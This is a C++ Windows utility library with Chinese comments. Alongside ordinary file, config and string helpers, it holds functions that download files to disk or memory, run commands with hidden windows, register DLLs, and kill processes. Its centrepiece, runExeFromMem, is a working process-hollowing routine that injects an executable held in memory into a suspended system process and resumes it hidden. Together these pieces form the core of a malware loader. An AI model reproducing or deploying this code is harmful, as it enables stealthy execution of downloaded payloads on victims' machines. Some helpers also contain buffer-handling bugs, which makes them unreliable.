#include "pch.h"
#include "CommonLib.h"
#include <iostream> 
#include <fstream>
using namespace std;

//内存操作操作----------------------------------
#include <time.h>
string createRandStr(int num)
{
	char randStr[10] = { 0 };
	srand((unsigned)time(0)); //产生随机化种子
	for (int i = 0; i < num; i++)
	{
		int x, r; //x表示这个字符的ascii码 ，r表示这个字符或数字
		r = rand() % 3; //随机使s为1或0，为1就是大写，为0就是小写 
		if (r == 1)        //
		{//如果s=1，将x赋为大写字母的ascii码 
			x = rand() % ('Z' - 'A' + 1) + 'A';
		}
		else if (r == 2)
		{//如果s=2，x赋为小写字母的ascii码 
			x = rand() % ('z' - 'a' + 1) + 'a';
		}
		else
		{
			x = rand() % ('9' - '0' + 1) + '0';
		}
		randStr[i] = x;
	}
	return string(randStr);
}

int findAndRemove(string& str, char c)
{//直接修改了str的内容，测试可用
	const char* src = str.c_str();
	if (src == NULL) return 0;
	size_t len = strlen(src);
	int count = 0;
	char* p = (char*)src;
	for (size_t i = 0; i <= len; i++)
	{
		if (*(p + i) == c)
		{
			p += i;
			memset(p, 0, len - i);
			count++;
			break;
		}
	}
	return count;
}

//查找并替换，返回-1表示失败
int findAndReplace(char* buf, long len,
	const char* search, const char* replace)
{
	int ret = -1;
	size_t slen = strlen(search);
	size_t rlen = strlen(replace);
	for (size_t i = 0; i < (size_t)len; i++)
	{
		if (buf[i] == search[0])
		{
			if (strncmp(&buf[i], search, slen) == 0)
			{
				memcpy(&buf[i], replace, rlen);
				ret = (int)i;
				break;
			}
		}
	}
	return ret;
}

//[node] item = value，cfgTxt是整个串，node是[node],item是item，返回value
string getCfgItem(const string& cfgTxt, const string& node, const string& item)
{
	size_t start = cfgTxt.find(node);
	//_cprintf("start=%zd\n", start);
	if (start == string::npos)
	{
		return string(""); //未找到node
	}
	else
	{
		start += node.length(); //node start-end
		size_t end = cfgTxt.find('[', start);
		//_cprintf("end=%zd\n", end);
		if (end == string::npos)
		{
			end = cfgTxt.length();
		}
		size_t start2 = cfgTxt.find(item, start);
		//_cprintf("start2=%zd\n", start2);
		if (start2 == string::npos || start2 >= end)
		{
			return string(""); //在node中未找到item
		}
		start2 += item.length(); //item start-end
		size_t end2 = cfgTxt.find('\r', start2);
		//_cprintf("end2=%zd\n", end2);
		if (end2 == string::npos)
		{
			end2 = cfgTxt.length();
		}
		if (end2 > end)
		{
			end2 = end;
		}
		string ret = cfgTxt.substr(start2, end2 - start2);
		//_cprintf("ret=%s\n", ret.c_str());
		for (size_t pos = 0; ;)
		{ //删除一些字符
			pos = ret.find_first_of(" =", pos);
			if (pos != std::string::npos)
			{
				ret.erase(pos, 1);
			}
			else
			{
				break;
			}
		}
		//_cprintf("return=%s\n", ret.c_str());
		return ret;
	}
}

/*
#include "md5.h"
string getMd5FromMem(const char input[], int len) 
{
	if (input == NULL || len == 0)
	{
		return "";
	}
	const unsigned int MD5_LEN = 16;
	unsigned char output[MD5_LEN] = { 0 };
	char str[MD5_LEN] = { 0 };
	string md5;
	MD5_CTX md5ctx;
	MD5Init(&md5ctx);
	MD5Update(&md5ctx, (unsigned char*)input, len);
	MD5Final(&md5ctx, output); //32位
	for (int i = 0; i < MD5_LEN; i++)
	{
		sprintf(str, "%02X", output[i]);
		md5.append(str);
	}
	return md5;
}

string getMd5FromFile(const string& dirFile)
{
	char* buf = NULL;
	int len = readFile(dirFile, buf);
	string md5 = getMd5FromMem(buf, len);
	if (buf != NULL)
	{
		delete[]buf;
	}
	return md5;
}

#include "unzip.h"
int unzipFromMem(const char in[], int len, char*& out)
{
	if (in == NULL || len == 0 || in[0]!='P' || in[1] != 'K')
	{//传入参数有误
		return -1;
	}
	HZIP hZip = OpenZip((void*)in, len, 0);
	if (hZip == NULL)
	{//打开句柄失败
		return -2;
	}
	ZIPENTRY ze; //内存方式
	if (ZR_OK != GetZipItem(hZip, 0, &ze)
		|| ze.unc_size <= 0)
	{//获取第一项失败
		CloseZip(hZip);
		return -3;
	}
	out = new char[ze.unc_size];
	if (out == NULL)
	{
		CloseZip(hZip);
		return -4;
	}
	memset(out, 0, ze.unc_size);
	if (ZR_OK != UnzipItem(hZip, 0, out, ze.unc_size))
	{
		CloseZip(hZip);
		delete[]out;
		out = NULL;
		return -4;
	}
	CloseZip(hZip);
	return ze.unc_size;
}*/

//文件操作----------------------------------
bool fileExist(const string& dirFile)
{
	fstream file(dirFile, ios::in);
	if (file)
	{ //默认打开它
		file.close();
		return true;
	}
	return false;
}

bool removeFile(const string& dirFile)
{
	/***************************************************************\
	|  *函数名 : remove
	|  *原  型 : int __cdecl remove(const char *_Filename)
	|  *功  能 : 该函数只能删除文件，不能删除文件夹，删除成功返回0，失败返回-1.
	|  *头文件 ：#include <io.h>：
	\***************************************************************/
	return remove(dirFile.c_str()) == 0;
}

long readFile(const string& dirFile, char*& buf)
{
	ifstream ifile(dirFile, ios::in | ios::binary);
	if (ifile && ifile.is_open())
	{
		ifile.seekg(0, ios::end);
		int len = (int)ifile.tellg();
		if (len > 0) {
			buf = new char[len];
			if (buf != NULL)
			{
				ifile.seekg(0, ios::beg);
				ifile.read((char*)buf, len);
				int len2 = (int)ifile.tellg();
				if (len2 == len)
				{
					ifile.close();
					return len;
				}
			}
		}
		ifile.close();
	}
	return -1;
}

bool writeFile(const string& dirFile, const char buf[], long bufLen)
{
	ofstream ofile;
	/* 文件打开模式：
	ios::in 为输入(读)而打开文件
	ios::out 为输出(写)而打开文件
	ios::ate 初始位置：文件尾(atend)
	ios::app 所有输出附加在文件末尾(append)
	ios::trunc 如果文件已存在则先删除该文件
	ios::binary 二进制方式
	ios::_Nocreate 不创建，文件不存在时打开失败
	ios::_Noreplace 不替换，文件存在时打开失败*/
	ofile.open(dirFile, ios::out | ios::trunc | ios::binary);
	if (ofile && ofile.is_open())
	{
		ofile.write(buf, bufLen);
		// seekg()和seekp()设置读(get)和写(put)的位置
		/* 读写指针的移动方向：
		ios::beg 从流开始位置计算的位移
		ios::cur 从流指针当前位置开始计算的位移
		ios::end 从流末尾处开始计算的位移*/
		//ofile.seekp(0, ios::end);
		long len = (long)ofile.tellp();
		if (len == bufLen)
		{// 关闭之后，无法获取长度
			ofile.close();
			return true;
		}
		ofile.close();
	}
	return false;
}

#include <io.h>
#include <direct.h> 
#define MAX_PATH_LEN 256
bool createDir(const string& dirPath)
{
	int dirPathLen = (int)dirPath.length();
	if (dirPathLen > MAX_PATH_LEN)
	{//路径太长
		return false;
	}
	char tmpDirPath[MAX_PATH_LEN] = { 0 };
	for (int i = 0; i <= dirPathLen; ++i)
	{//从头开始逐个查找并创建
		tmpDirPath[i] = dirPath[i];
		if (tmpDirPath[i] == '\\' || tmpDirPath[i] == '/'
			|| tmpDirPath[i] == '\0')
		{//按路径进行创建
			/***************************************************************\
			|  *函数名 : _access
			|  *原  型 : int __cdecl _access(const char *_Filename,int _AccessMode)
			|  *功  能 : 判断某目录权限，若不存在或无此权限则返回-1，否则返回0
			|  *头文件 ：#include <io.h>：
			\***************************************************************/
			if (_access(tmpDirPath, 0) != 0)
			{//不存在，则创建
				/***************************************************************\
				|  *函数名 : _mkdir
				|  *原  型 : int __cdecl _mkdir(const char* _Path)
				|  *功  能 : 创建目录,若创建成功则返回0,若已存在或创建失败则返回-1
				|  *头文件 ：#include <direct.h>
				\***************************************************************/
				int ret = _mkdir(tmpDirPath);
				if (ret != 0)
				{//失败，则返回
					return false;
				}
			}
		}
	}
	return true;
}

bool removeDir(const string& dirPath)
{
	_finddata_t fd; //find the storage structure of the same properties file.
	int noFile = 0; // the tag for the system's hidden files
	string path = dirPath + "\\*";
	intptr_t handle = _findfirst(path.c_str(), &fd);
	bool ret = true;
	//find the first matching file
	if (handle != -1)
	{
		//find next matching file
		while (0 == _findnext(handle, &fd))
		{
			// "." and ".." are not processed
			noFile = strcmp(fd.name, "..");
			if (0 != noFile)
			{
				path.clear();
				path = dirPath + "\\" + fd.name;
				//fb.attrib == 16 means folder
				if (fd.attrib == _A_SUBDIR)
				{
					bool r = removeDir(path);
					ret = r ? ret : false;
				}
				else
				{
					//not folder, delete it. if empty folder, using _rmdir istead.
					int r = remove(path.c_str());
					ret = (r == 0) ? ret : false;
				}
			}
		}
		// close the folder and delete it only if it is closed. 
		// For standard c, using closedir instead(findclose -> closedir).
		// when Handle is created, it should be closed at last.  
		_findclose(handle);
	}
	//判断某目录权限，若不存在或无此权限则返回-1，否则返回0
	if (_access(dirPath.c_str(), 0) == 0)
	{//存在，则删除
		/***************************************************************\
		|  *函数名 : _rmdir
		|  *原  型 : int __cdecl _rmdir(const char* _Path)
		|  *功  能 : 删除空目录,若删除成功则返回0,否则返回-1
		|  *头文件 ：#include <direct.h>
		\***************************************************************/
		int r = _rmdir(dirPath.c_str());
		ret = (r == 0) ? ret : false;
	}
	return ret;
}

//网络操作------------------------------------
#pragma comment(lib,"ws2_32.lib")
bool checkDomain(const string& dns, string& result)
{
	struct addrinfo hints = { 0 };
	struct addrinfo* res = NULL, *cur = NULL;
	int ret = 0;
#ifdef _WIN32
	WSADATA data = { 0 };
	if (WSAStartup(MAKEWORD(1, 1), &data) != 0)	
	{
		return false;
	}
#endif
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_INET; /* Allow IPv4 */ //AF_INET6 IPv6
	hints.ai_flags = AI_PASSIVE; /* For wildcard IP address */
	hints.ai_protocol = 0; /* Any protocol */ //IP协议
	hints.ai_socktype = SOCK_STREAM; //基于TCP
	ret = getaddrinfo(dns.data(), NULL, &hints, &res);
	if (ret != 0) 
	{ //非0都是错误
		printf("error#%d\n", ret);
		return false;
	}
	else 
	{ //10093-未初始化;
		struct sockaddr_in* addr;
		char ipBuf[16] = { 0 };
		for (cur = res; cur != NULL; cur = cur->ai_next) {
			addr = (struct sockaddr_in*)cur->ai_addr;
			inet_ntop(AF_INET, &addr->sin_addr, ipBuf, sizeof(ipBuf));
			result = ipBuf;
		}
	}
	freeaddrinfo(res); //释放地址信息

	string errors[] = { "0.0.0.0", "127.0.0.0", //回送地址
		"10.0.0.0","172.16.0.0","192.168.0.0",  //内网地址
		"" }; //空地址
	for (string err : errors)
	{
		if (err == result)
		{
			return false;
		}
	}
	return true;
}

#include <UrlMon.h>
#pragma comment(lib,"Urlmon.lib")
//下载文件到磁盘，成功则返回true，否则返回false
bool downloadFileToDisk(const string& url, const string& dirFile)
{
	HRESULT hr = URLDownloadToFileA(0, //Microsoft ActiveX component
		url.c_str(), //要下载的url地址,不能为空.
		dirFile.c_str(), //下载后保存的文件名.
		0, //保留字段,必需为0
		NULL); //下载进度状态回调
	return SUCCEEDED(hr);
}

#include <wininet.h>
#pragma comment(lib, "WinINet.lib")
//下载文件到内存，函数内部分配内存，返回文件长度或-1
long downloadFileToMem(const string& url, char*& buf)
{//::MessageBox(NULL, TEXT("成功"), TEXT("下载文件"), MB_OK);
	HINTERNET hSession = InternetOpenA("HTTPREAD", // User Agent
		INTERNET_OPEN_TYPE_PRECONFIG, //获取代理
		NULL, NULL, 0);//flag=INTERNET_FLAG_ASYNC; 0 for Synchronous    
	if (hSession == NULL)
	{
		DWORD dwError = GetLastError();
		return -1;
	}
	HINTERNET hRequest = InternetOpenUrlA(hSession,
		url.c_str(), NULL, //Headers
		0, //dwHeadersLength
		INTERNET_FLAG_RELOAD, //dwFlags
		0); //dwContext
	if (hRequest == NULL)
	{//ERROR_INTERNET_OPERATION_CANCELLED
		DWORD dwError = GetLastError();
		InternetCloseHandle(hSession);
		return -2;
	}
	DWORD nBufferLength = 0, dwSize = sizeof(nBufferLength);
	HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
		&nBufferLength, &dwSize, 0);
	if (nBufferLength == 0)
	{
		DWORD dwError = GetLastError();
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hSession);
		return -3;
	}
	DWORD nReadLength = 0;
	buf = new char[nBufferLength];
	if (buf == NULL)
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hSession);
		return -4;
	}
	memset(buf, 0, nBufferLength);
	InternetReadFile(hRequest, buf, nBufferLength, &nReadLength);
	if (nReadLength != nBufferLength)
	{
		DWORD dwError = GetLastError();
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hSession);
		delete[]buf;
		return -5;
	}
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hSession);
	return nReadLength;
}


#include <windows.h>
//系统操作-----------------------------------
string getEnvVariable(const string& name)
{
	char buffer[MAX_PATH_LEN] = { 0 };
	DWORD ret = GetEnvironmentVariableA(name.c_str(), buffer, MAX_PATH_LEN);
	if (ret != 0 && ret < MAX_PATH_LEN)
	{
		return string(buffer);
	}
	return "";
}

bool runCmdLine(const string& cmdStr)
{
	//(system("pause") >= 0); 
	//(system("color 0A") >= 0);
	//return (system(CMD64) >= 0); //卡死
	//若函数调用成功，则返回值大于31。
	//return (WinExec(CMD64, SW_HIDE) > 31);
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = FALSE;// TRUE; //不显示窗口
	PSTR cmdline = (PSTR)cmdStr.c_str();
	BOOL bRet = ::CreateProcessA(NULL, cmdline, NULL, NULL,
		FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (bRet)
	{//不使用的句柄最好关掉
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return true;
	}
	return false;
}

bool runExeFromFile(const string& dirFile)
{
	if (!fileExist(dirFile))
	{
		return false;
	}
	string strCmdLine;
	if (fileExist(CMD_SYSWOW64))
	{
		strCmdLine = CMD_SYSWOW64;
	}
	else if (fileExist(CMD_SYSTEM32))
	{
		strCmdLine = CMD_SYSTEM32;
	}
	strCmdLine += CMD_PARAM_START;
	strCmdLine += dirFile.c_str();
	return runCmdLine(strCmdLine);
}

bool runExeFromFile2(const string& dirFile)
{
	if (!fileExist(dirFile))
	{
		return false;
	}
	return runCmdLine(dirFile);
}

bool loadDllFromFile(const string& dirFile)
{
	if (!fileExist(dirFile))
	{
		return false;
	}
	string strCmdLine = CMD_REG_SVR;
	strCmdLine += dirFile.c_str();
	return runCmdLine(strCmdLine);
}

bool killProcessAndRemoveFile(const string& dirFile)
{
	size_t pos = dirFile.rfind('\\') + 1;
	string fileName = dirFile.substr(pos, dirFile.length() - pos);
	string cmdStr = "taskkill /f /im " + fileName; //结束进程
	//DWORD dwLastError = 2：ERROR_FILE_NOT_FOUND
	//string cmdStr2 = "del /q /f \"" + dirFile + "\""; //删除文件
	if (!runCmdLine(cmdStr))
	{
		DWORD dwLastError = GetLastError();
		bool ret = false;
	}
	//等待后，删文件才成功 100失败，200成功
	Sleep(300); //等待一会，确保成功
	return removeFile(dirFile);
}

#include <winternl.h> //NtWaitForSingleObject
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib,"ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE, NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE, PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE, PULONG);

//EXTERN_C NTSTATUS NTAPI NtQueryInformationProcess(HANDLE, 
//		PROCESSINFOCLASS, PVOID, ULONG, PULONG);
//NTSYSAPI NTSTATUS NTAPI NtQueryInformationProcess(
//	IN HANDLE 　　　　　　　ProcessHandle, 　　　　　// 进程句柄
//	IN PROCESSINFOCLASS 　　InformationClass, 　　　　// 信息类型
//	OUT PVOID 　　　　　　　ProcessInformation, 　　　// 缓冲指针
//	IN ULONG 　　　　　　 　ProcessInformationLength, // 以字节为单位的缓冲大小
//	OUT PULONG 　　　　　 　ReturnLength OPTIONAL     // 写入缓冲的字节数
//);
#if defined(_AMD64_) //_WIN64
#define HOST_MACHINE IMAGE_FILE_MACHINE_AMD64
#else
#define HOST_MACHINE IMAGE_FILE_MACHINE_I386
#endif

#if defined(_AMD64_) //_WIN64
typedef struct POINTER_LIST
{
	struct POINTER_LIST* next;
	void* address;
} POINTER_LIST;

static void
FreePointerList(_In_ HANDLE hProcess, POINTER_LIST* head)
{
	POINTER_LIST* node = head;
	while (node)
	{
		POINTER_LIST* next;
		VirtualFreeEx(hProcess, node->address, 0, MEM_RELEASE);
		next = node->next;
		free(node);
		node = next;
	}
}
#endif

static BOOL
CheckSize(SIZE_T size, SIZE_T expected)
{
	if (size < expected)
	{
		SetLastError(ERROR_INVALID_DATA);
		return FALSE;
	}
	return TRUE;
}

static inline SIZE_T
AlignValueUp(SIZE_T value, SIZE_T alignment)
{
	return (value + alignment - 1) & ~(alignment - 1);
}

int runExeFromMem(const char* data, long size)
{
	PIMAGE_DOS_HEADER dos_header = NULL;
	PIMAGE_NT_HEADERS nt_headers = NULL;
	PIMAGE_SECTION_HEADER sec_header = NULL;
	PVOID imageBase = NULL, oldBase = NULL;
	STARTUPINFOA si = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW; //1
	si.wShowWindow = SW_HIDE;// SW_NORMAL;
	si.cb = sizeof(si);
	PROCESS_INFORMATION pi = { 0 };
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;
	DWORD i = 0, dwRet = 0;
	NTSTATUS ntRet = 0;
	SIZE_T optionalSectionSize = 0;
	SIZE_T lastSectionEnd = 0;
	SIZE_T alignedImageSize = 0;
	SYSTEM_INFO sysInfo = { 0 };
	GetNativeSystemInfo(&sysInfo);
#if defined(_AMD64_) //_WIN64
	POINTER_LIST* blockedMemory = NULL;
#endif
	PROCESS_BASIC_INFORMATION pbi = { 0 };

	if (data == NULL || size == 0)
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		dwRet = 1;
		goto EXIT;
	}
	if (!CheckSize(size, sizeof(IMAGE_DOS_HEADER)))
	{//DWORD dwLastError =  GetLastError();
		dwRet = 2;
		goto EXIT;
	}
	dos_header = (PIMAGE_DOS_HEADER)data;
	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
	{
		SetLastError(MSSIPOTF_E_BAD_MAGICNUMBER);
		dwRet = 3;
		goto EXIT;
	}

	if (!CheckSize(size, dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS)))
	{//DWORD dwLastError =  GetLastError();
		dwRet = 4;
		goto EXIT;
	}
	nt_headers = (PIMAGE_NT_HEADERS) & ((LPBYTE)data)[dos_header->e_lfanew];
	if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
	{
		SetLastError(ERROR_INVALID_EXE_SIGNATURE);
		dwRet = 5;
		goto EXIT;
	}

	if (nt_headers->FileHeader.Machine != HOST_MACHINE)
	{
		SetLastError(ERROR_IMAGE_MACHINE_TYPE_MISMATCH);
		dwRet = 6;
		goto EXIT;
	}

	if (nt_headers->OptionalHeader.SectionAlignment & 1)
	{
		// Only support section alignments that are a multiple of 2
		SetLastError(ERROR_INSTRUCTION_MISALIGNMENT);
		dwRet = 7;
		goto EXIT;
	}

	sec_header = IMAGE_FIRST_SECTION(nt_headers);
	optionalSectionSize = nt_headers->OptionalHeader.SectionAlignment;
	for (i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, sec_header++)
	{
		SIZE_T endOfSection = 0;
		if (sec_header->SizeOfRawData == 0)
		{
			// Section without data in the DLL
			endOfSection = sec_header->VirtualAddress + optionalSectionSize;
		}
		else
		{
			endOfSection = sec_header->VirtualAddress
				+ (SIZE_T)sec_header->SizeOfRawData;
		}

		if (endOfSection > lastSectionEnd)
		{
			lastSectionEnd = endOfSection;
		}
	}
	alignedImageSize = AlignValueUp(nt_headers->OptionalHeader.SizeOfImage,
		sysInfo.dwPageSize);
	if (alignedImageSize != AlignValueUp(lastSectionEnd, sysInfo.dwPageSize))
	{
		SetLastError(ERROR_INSTRUCTION_MISALIGNMENT);
		dwRet = 8;
		goto EXIT;
	}

	// Start the target application
	//优先使用system32目录下64位的cmd.exe
	if (!CreateProcessA(HOST_SYSTEM32, NULL, NULL, NULL, FALSE,
		CREATE_SUSPENDED, NULL, NULL, &si, &pi))
	{//DWORD dwLastError =  GetLastError();
		dwRet = 9;
		goto EXIT;
	}
	ntRet = NtGetContextThread(pi.hThread, &ctx);
#if defined(_X86_) //32位
	//ntRet = NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8),
	//	&oldBase, sizeof(PVOID), NULL);
	ntRet = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
		(PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	ntRet = NtReadVirtualMemory(pi.hProcess,
		(PVOID)((PBYTE)pbi.PebBaseAddress + 2 * sizeof(PVOID)),
		&oldBase, sizeof(PVOID), NULL);
#elif defined(_AMD64_) //_WIN64
	//ntRet = NtReadVirtualMemory(pi.hProcess, (PVOID)(ctx.Rbx + 2 * sizeof(PVOID)), 
	//	&base, sizeof(PVOID), NULL);
	ntRet = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
		(PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	ntRet = NtReadVirtualMemory(pi.hProcess,
		(PVOID)((PBYTE)pbi.PebBaseAddress + 2 * sizeof(PVOID)),
		&oldBase, sizeof(PVOID), NULL);
#endif
	if (oldBase == (PVOID)nt_headers->OptionalHeader.ImageBase)
	{	//(base != 0) { //这句能让x86也启动不了
		ntRet = NtUnmapViewOfSection(pi.hProcess, oldBase);
	}

	imageBase = VirtualAllocEx(pi.hProcess, (PVOID)nt_headers->OptionalHeader.ImageBase,
		nt_headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (imageBase == NULL)
	{
		// try to allocate memory at arbitrary position
		imageBase = (PVOID)VirtualAllocEx(pi.hProcess, NULL,
			alignedImageSize, MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);
		if (imageBase == NULL)
		{
			SetLastError(ERROR_OUTOFMEMORY);
			dwRet = 10;
			goto EXIT;
		}
	}
#if defined(_AMD64_) //_WIN64
	// Memory block may not span 4 GB boundaries.
	while ((((uintptr_t)imageBase) >> 32)
		< (((uintptr_t)((LPBYTE)imageBase + alignedImageSize)) >> 32))
	{
		POINTER_LIST* node = (POINTER_LIST*)malloc(sizeof(POINTER_LIST));
		if (!node)
		{
			VirtualFreeEx(pi.hProcess, imageBase, 0, MEM_RELEASE);
			FreePointerList(pi.hProcess, blockedMemory);
			SetLastError(ERROR_OUTOFMEMORY);
			dwRet = 11;
			goto EXIT;
		}

		node->next = blockedMemory;
		node->address = imageBase;
		blockedMemory = node;

		imageBase = (PVOID)VirtualAllocEx(pi.hProcess, NULL,
			alignedImageSize, MEM_RESERVE | MEM_COMMIT,
			PAGE_READWRITE);
		if (imageBase == NULL)
		{
			FreePointerList(pi.hProcess, blockedMemory);
			SetLastError(ERROR_OUTOFMEMORY);
			dwRet = 12;
			goto EXIT;
		}
	}
#endif
	ntRet = NtWriteVirtualMemory(pi.hProcess, imageBase, (PVOID)data,
		nt_headers->OptionalHeader.SizeOfHeaders, NULL);
	for (i = 0; i < nt_headers->FileHeader.NumberOfSections; i++)
	{
		sec_header = (PIMAGE_SECTION_HEADER)((LPBYTE)data
			+ dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS)
			+ (i * sizeof(IMAGE_SECTION_HEADER)));
		// Write the remaining sections of the replacement executable into child process
		ntRet = NtWriteVirtualMemory(pi.hProcess,
			(PVOID)((LPBYTE)imageBase + sec_header->VirtualAddress),
			(PVOID)((LPBYTE)data + sec_header->PointerToRawData),
			sec_header->SizeOfRawData, NULL);
	}
#if defined(_X86_) //32位
	ntRet = NtWriteVirtualMemory(pi.hProcess,
		(PVOID)((PBYTE)pbi.PebBaseAddress + 2 * sizeof(PVOID)),
		//&nt_headers->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
		&imageBase, sizeof(PVOID), NULL);
	ctx.Eax = (DWORD)((LPBYTE)imageBase + nt_headers->OptionalHeader.AddressOfEntryPoint);
#elif defined(_AMD64_) //_WIN64
	//NtWriteVirtualMemory(pi.hProcess, (PVOID)(ctx.Rbx + 2 * sizeof(PVOID)),
	//	&imageBase, sizeof(PVOID), NULL);
	ntRet = NtWriteVirtualMemory(pi.hProcess,
		(PVOID)((PBYTE)pbi.PebBaseAddress + 2 * sizeof(PVOID)),
		//&nt_headers->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
		&imageBase, sizeof(PVOID), NULL);
	//https://www.cnblogs.com/adylee/p/9926177.html
	//x64下用ntdll中的NtQueryInformationProcess获取PEB，context的Rcx为Rip
	ctx.Rcx = ((DWORD64)imageBase + nt_headers->OptionalHeader.AddressOfEntryPoint);
#endif
	ntRet = NtSetContextThread(pi.hThread, &ctx);
	ntRet = NtResumeThread(pi.hThread, NULL);
	ntRet = NtWaitForSingleObject(pi.hProcess, FALSE, NULL);

EXIT:
	if (pi.hProcess)
	{
		ntRet = NtTerminateProcess(pi.hProcess, dwRet);
	}
	if (pi.hThread)
	{
		ntRet = NtClose(pi.hThread);
	}
	if (pi.hProcess)
	{
		ntRet = NtClose(pi.hProcess);
	}
	return dwRet;
}


//其他函数-----------------------------------
PSTR ConvertWSTRtoSTR(PCWSTR pStrIn)
{
	LPSTR pStrOut = NULL;
	if (pStrIn != NULL)
	{
		int nInputStrLen = (int)wcslen(pStrIn);
		// Double NULL Termination
		int nOutputStrLen = WideCharToMultiByte(CP_ACP, 0,
			pStrIn, nInputStrLen, NULL, 0, 0, 0) + 1;
		pStrOut = new CHAR[nOutputStrLen];
		if (pStrOut)
		{
			memset(pStrOut, 0x00, nOutputStrLen * sizeof(CHAR));
			nOutputStrLen = WideCharToMultiByte(CP_ACP, 0, pStrIn,
				nInputStrLen, pStrOut, nOutputStrLen, 0, 0);
		}
	}
	return pStrOut;
}

PWSTR ConvertSTRtoWSTR(PCSTR pStrIn)
{
	LPWSTR pStrOut = NULL;
	if (pStrIn != NULL)
	{
		int nInputStrLen = (int)strlen(pStrIn);
		int nOutputStrLen = MultiByteToWideChar(CP_ACP, 0,
			pStrIn, nInputStrLen, NULL, 0) + 1;
		pStrOut = new WCHAR[nOutputStrLen];
		if (pStrOut)
		{
			memset(pStrOut, 0x00, nOutputStrLen * sizeof(WCHAR));
			nOutputStrLen = MultiByteToWideChar(CP_ACP, 0, pStrIn,
				nInputStrLen, pStrOut, nOutputStrLen);
		}
	}
	return pStrOut;
}

PSTR CopySTR(PCSTR pStrIn)
{
	PSTR pStrOut = NULL;
	int nInputStrLen = (int)strlen(pStrIn);
	int nOutputStrLen = nInputStrLen + 1;
	pStrOut = new CHAR[nOutputStrLen];
	if (pStrOut)
	{
		memset(pStrOut, 0x00, nOutputStrLen * sizeof(CHAR));
		memcpy(pStrOut, pStrIn, nInputStrLen);
	}
	return pStrOut;
}

PSTR ConvertTSTRtoSTR(PCTSTR pStrIn)
{
#ifdef UNICODE
	return ConvertWSTRtoSTR(pStrIn);
#else
	return CopySTR((PCSTR)pStrIn);
#endif
}

PTSTR ConvertSTRtoTSTR(PCSTR pStrIn)
{
#ifdef UNICODE
	return ConvertSTRtoWSTR(pStrIn);
#else
	return CopySTR(pStrIn);
#endif
}

#include <tlhelp32.h>
string GetProcessName(int processId)
{
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot error.\n");
		return "";
	}

	string str;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	BOOL bProcess = Process32First(hProcessSnap, &pe32);
	while (bProcess)
	{
		if (pe32.th32ProcessID == processId)
		{
			PSTR pStr = ConvertWSTRtoSTR(pe32.szExeFile);
			str = string(pStr);
			delete[]pStr;
			break;
		}
		bProcess = Process32Next(hProcessSnap, &pe32);
	}
	CloseHandle(hProcessSnap);
	return str;
}
